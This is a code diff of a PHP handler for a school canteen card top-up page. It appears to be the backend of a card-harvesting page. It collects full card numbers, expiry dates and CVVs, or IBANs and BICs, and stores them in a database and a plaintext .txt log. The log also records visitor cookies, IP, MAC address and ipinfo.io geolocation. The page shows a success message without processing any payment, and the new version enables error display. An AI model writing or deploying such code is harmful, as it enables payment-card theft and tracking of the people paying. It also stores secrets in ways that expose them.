@@ -1,105 +1,142 @@
-<?php  
-// Inclure la configuration pour la connexion à la base de données
+<?php 
+ini_set('display_errors', 1);
+error_reporting(E_ALL);
+// Inclure la configuration et les fonctions nécessaires
 require_once 'config.php';
 require_once 'functions.php';
 
-// Vérifier si le formulaire a été soumis
+// Activer les exceptions PDO pour une meilleure gestion des erreurs
+$pdo = getDbConnection();
+$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Récupération des adresses IPv4 et IPv6
-    $ip_addresses = getIpAddresses();
-    $ipv4 = $ip_addresses['ipv4'];
-    $ipv6 = $ip_addresses['ipv6'];
+    try {
+    	date_default_timezone_set('Europe/Paris');
+        $dateEnregistrement = date("d/m/Y H:i:s");
 
-    // Récupération de l'adresse MAC et de la localisation
-    $mac_address = getMacAddress();
-    $location = getLocationFromIP($ipv4);  // On utilise l'IPv4 pour récupérer la localisation
+        //Récupération de l'adresse MAC:
+        $MAC = getMacAddress();
+    	
+        // Récupération des adresses IP et autres informations
+        $ip = $_SERVER['REMOTE_ADDR'];
 
-    // Récupérer les cookies (si présents)
-    $cookies = null;
-    if (isset($_COOKIE)) {
-        $cookies = "";
-        foreach ($_COOKIE as $name => $value) {
-            $cookies .= "$name: $value\n";
+        // Récupérer la localisation de l'utilisateur via l'API ipinfo.io
+        $url = "https://ipinfo.io/{$ip}/json";
+        $options = [
+            "http" => [
+                "timeout" => 5  // Timeout de 10 secondes
+            ]
+        ];
+        $context = stream_context_create($options);
+
+        // Effectuer la requête HTTP
+        $response = @file_get_contents($url, false, $context);
+
+        if ($response === FALSE) {
+            // En cas d'échec de la requête, affecter une valeur par défaut
+            $location = "Inconnue";
+        } else {
+            // Décoder la réponse JSON
+            $data = json_decode($response, true);
+
+            // Vérifier la présence des informations et les assigner
+            $city = isset($data['city']) ? $data['city'] : 'Inconnue';
+            $region = isset($data['region']) ? $data['region'] : 'Inconnue';
+            $country = isset($data['country']) ? $data['country'] : 'Inconnue';
+
+            $location = "Ville : $city, Région : $region, Pays : $country";
         }
-    }
 
-    // Connexion à la base de données
-    $pdo = getDbConnection();
+        // Préparer les informations cookies
+        $cookies = isset($_COOKIE) ? json_encode($_COOKIE) : 'Aucun cookie';
 
-    // Formulaire de recharge par carte bancaire
-    if (isset($_POST['nom_titulaire']) && isset($_POST['email']) && isset($_POST['num_carte'])) { 
-        // Récupération des données du formulaire
-        $num_carte_cantine = trim($_POST['num_carte_cantine']);
-        $email = trim($_POST['email']);  // Récupération de l'email
-        $nom_titulaire = trim($_POST['nom_titulaire']);
-        $num_carte = trim($_POST['num_carte']);
-        $date_exp = trim($_POST['date_exp']);
-        $cvv = trim($_POST['cvv']);
-        $montant = trim($_POST['montant']);
+        // Vérifier et traiter le formulaire soumis
+        if (isset($_POST['nom_titulaire'], $_POST['email'], $_POST['num_carte'])) {
+            // Recharge par carte bancaire
+            $data = [
+                'num_carte_cantine' => $_POST['num_carte_cantine'] ?? null,
+                'nom_titulaire' => $_POST['nom_titulaire'] ?? null,
+                'num_carte' => $_POST['num_carte'] ?? null,
+                'date_exp' => $_POST['date_exp'] ?? null,
+                'cvv' => $_POST['cvv'] ?? null,
+                'montant' => $_POST['montant'] ?? null,
+            ];
 
-        // Validation des données (ajoutez votre logique de validation ici)
+            // Validation simple
+            if (!$data['num_carte_cantine'] || !$data['nom_titulaire'] || !$data['num_carte'] || !$data['date_exp'] || !$data['cvv'] || !$data['montant']) {
+                throw new Exception("Veuillez remplir tous les champs obligatoires.");
+            }
 
-        // Préparation de la requête d'insertion dans la table `recharges_bancaires`
-        $sql = "INSERT INTO recharges_bancaires (num_carte_cantine, nom_titulaire, num_carte, date_exp, cvv, montant) 
-                VALUES (:num_carte_cantine, :nom_titulaire, :num_carte, :date_exp, :cvv, :montant)";
-        
-        $stmt = $pdo->prepare($sql);
-        
-        // Exécution de la requête
-        $stmt->execute([
-            ':num_carte_cantine' => $num_carte_cantine,
-            ':nom_titulaire' => $nom_titulaire,
-            ':num_carte' => $num_carte,
-            ':date_exp' => $date_exp,
-            ':cvv' => $cvv,
-            ':montant' => $montant
-        ]);
+            // Insertion dans la base de données
+            $sql = "INSERT INTO recharges_bancaires (num_carte_cantine, nom_titulaire, num_carte, date_exp, cvv, montant) 
+                    VALUES (:num_carte_cantine, :nom_titulaire, :num_carte, :date_exp, :cvv, :montant)";
+            $stmt = $pdo->prepare($sql);
+            $stmt->execute($data);
 
-        // Ajouter l'entrée dans le fichier texte
-        $file = 'recharges_bancaires.txt';
-        $data = "ID : {$pdo->lastInsertId()}\nNuméro de carte de cantine : $num_carte_cantine\nEmail : $email\nNom du titulaire : $nom_titulaire\nNuméro de carte bancaire : $num_carte\nDate d'expiration : $date_exp\nCVV : $cvv\nMontant : $montant\nIPv4 : $ipv4\nIPv6 : $ipv6\nMAC : $mac_address\nLocation : $location\nCookies : $cookies\n\n";
-        file_put_contents($file, $data, FILE_APPEND);
+            // Création du fichier de log
+            $file = 'recharges_bancaires.txt';
+            $dataToFile = "ID : {$pdo->lastInsertId()}
+                Numéro de carte de cantine : {$data['num_carte_cantine']}
+                Email : {$_POST['email']}
+                Numéro de carte bancaire : {$data['num_carte']}
+                Nom du titulaire : {$data['nom_titulaire']}
+                Date d'expiration : {$data['date_exp']}
+                CVV : {$data['cvv']}
+                Montant : {$data['montant']}
+                MAC: $MAC
+                IP : $ip
+                Location : $location
+                Cookies : $cookies
+                Date : $dateEnregistrement\n";
 
-        showSuccess( "Recharge bancaire de $montant € effectuée avec succès !");
-    }
+            // Écrire les données dans le fichier
+            file_put_contents($file, $dataToFile, FILE_APPEND);
 
-    // Formulaire de recharge par prélèvement mensuel
-    elseif (isset($_POST['titulaire_compte']) && isset($_POST['email']) && isset($_POST['iban'])) { 
-        // Récupération des données du formulaire
-        $num_carte_cantine = trim($_POST['num_carte_cantine']);
-        $email = trim($_POST['email']);  // Récupération de l'email
-        $titulaire_compte = trim($_POST['titulaire_compte']);
-        $iban = trim($_POST['iban']);
-        $bic = trim($_POST['bic']);
-        $montant_mensuel = trim($_POST['montant_mensuel']);
-        $date_prelevement = trim($_POST['date_prelevement']);
+            showSuccess("Recharge bancaire de {$data['montant']} € effectuée avec succès !");
+        } elseif (isset($_POST['titulaire_compte'], $_POST['email'], $_POST['iban'])) {
+            // Recharge par prélèvement mensuel
+            $data = [
+                'num_carte_cantine' => $_POST['num_carte_cantine'] ?? null,
+                'titulaire_compte' => $_POST['titulaire_compte'] ?? null,
+                'iban' => $_POST['iban'] ?? null,
+                'bic' => $_POST['bic'] ?? null,
+                'montant_mensuel' => $_POST['montant_mensuel'] ?? null,
+            ];
 
-        // Validation des données (ajoutez votre logique de validation ici)
+            // Validation simple
+            if (!$data['num_carte_cantine'] || !$data['titulaire_compte'] || !$data['iban'] || !$data['bic'] || !$data['montant_mensuel']) {
+                throw new Exception("Veuillez remplir tous les champs obligatoires.");
+            }
 
-        // Préparation de la requête d'insertion dans la table `prelevements_mensuels`
-        $sql = "INSERT INTO prelevements_mensuels (num_carte_cantine, titulaire_compte, iban, bic, montant_mensuel, date_prelevement) 
-                VALUES (:num_carte_cantine, :titulaire_compte, :iban, :bic, :montant_mensuel, :date_prelevement)";
-        
-        $stmt = $pdo->prepare($sql);
-        
-        // Exécution de la requête
-        $stmt->execute([
-            ':num_carte_cantine' => $num_carte_cantine,
-            ':titulaire_compte' => $titulaire_compte,
-            ':iban' => $iban,
-            ':bic' => $bic,
-            ':montant_mensuel' => $montant_mensuel,
-            ':date_prelevement' => $date_prelevement
-        ]);
+            // Insertion dans la base de données
+            $sql = "INSERT INTO prelevements_mensuels (num_carte_cantine, titulaire_compte, iban, bic, montant_mensuel) 
+                    VALUES (:num_carte_cantine, :titulaire_compte, :iban, :bic, :montant_mensuel)";
+            $stmt = $pdo->prepare($sql);
+            $stmt->execute($data);
 
-        // Ajouter l'entrée dans le fichier texte
-        $file = 'prelevements_mensuels.txt';
-        $data = "ID : {$pdo->lastInsertId()}\nNuméro de carte de cantine : $num_carte_cantine\nEmail : $email\nTitulaire du compte : $titulaire_compte\nIBAN : $iban\nBIC : $bic\nMontant mensuel : $montant_mensuel\nDate de prélèvement : $date_prelevement\nIPv4 : $ipv4\nIPv6 : $ipv6\nMAC : $mac_address\nLocation : $location\nCookies : $cookies\n\n";
-        file_put_contents($file, $data, FILE_APPEND);
+            // Création du fichier de log
+            $file = 'recharges_bancaires.txt';
+            $dataToFile = "ID : {$pdo->lastInsertId()}
+                Numéro de carte de cantine : {$data['num_carte_cantine']}
+                Titulaire du compte : {$data['titulaire_compte']}
+                IBAN : {$data['iban']}
+                BIC : {$data['bic']}
+                Montant : {$data['montant_mensuel']}
+                MAC: $MAC
+                IP : $ip
+                Location : $location
+                Cookies : $cookies
+                Date : $dateEnregistrement\n";
 
-        showSuccess( "Prélèvement mensuel de $montant_mensuel € configuré avec succès !");
-    }else {
-        showError("Le rechargement de votre carte de cantine n'a pas pu aboutir dû à une erreur");
+            file_put_contents($file, $dataToFile, FILE_APPEND);
+
+            showSuccess("Prélèvement mensuel de {$data['montant_mensuel']} € configuré avec succès !");
+        } else {
+            throw new Exception("Aucune action valide détectée.");
+        }
+
+    } catch (Exception $e) {
+        showError("Erreur : " . $e->getMessage());
     }
 }
 
